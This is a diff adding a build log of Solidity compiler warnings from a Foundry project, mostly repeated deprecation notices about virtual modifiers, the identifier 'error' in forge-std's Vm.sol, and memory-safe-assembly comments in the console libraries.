@@ -1,0 +1,2261 @@
+Compiling 1 files with Solc 0.8.35
+Solc 0.8.35 finished in 372.13ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/console.sol:11:9:
+   |
+11 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:15:9:
+   |
+15 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:23:9:
+   |
+23 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:32:9:
+   |
+32 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:40:9:
+   |
+40 |         assembly {
+   |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:52:13:
+   |
+52 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:63:13:
+   |
+63 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:75:13:
+   |
+75 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:82:13:
+   |
+82 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+  --> lib/forge-std/src/safeconsole.sol:91:13:
+   |
+91 |             assembly {
+   |             ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:103:9:
+    |
+103 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:112:9:
+    |
+112 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:122:9:
+    |
+122 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:131:9:
+    |
+131 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:141:9:
+    |
+141 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:150:9:
+    |
+150 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:162:9:
+    |
+162 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:181:9:
+    |
+181 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:194:9:
+    |
+194 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:205:9:
+    |
+205 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:217:9:
+    |
+217 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:228:9:
+    |
+228 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:240:9:
+    |
+240 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:251:9:
+    |
+251 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:265:9:
+    |
+265 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:286:9:
+    |
+286 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:300:9:
+    |
+300 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:311:9:
+    |
+311 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:323:9:
+    |
+323 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:334:9:
+    |
+334 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:346:9:
+    |
+346 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:357:9:
+    |
+357 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:371:9:
+    |
+371 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:392:9:
+    |
+392 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:406:9:
+    |
+406 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:417:9:
+    |
+417 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:429:9:
+    |
+429 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:440:9:
+    |
+440 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:452:9:
+    |
+452 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:463:9:
+    |
+463 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:477:9:
+    |
+477 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:498:9:
+    |
+498 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:514:9:
+    |
+514 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:535:9:
+    |
+535 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:551:9:
+    |
+551 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:572:9:
+    |
+572 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:588:9:
+    |
+588 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:609:9:
+    |
+609 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+   --> lib/forge-std/src/safeconsole.sol:627:9:
+    |
+627 |         assembly {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
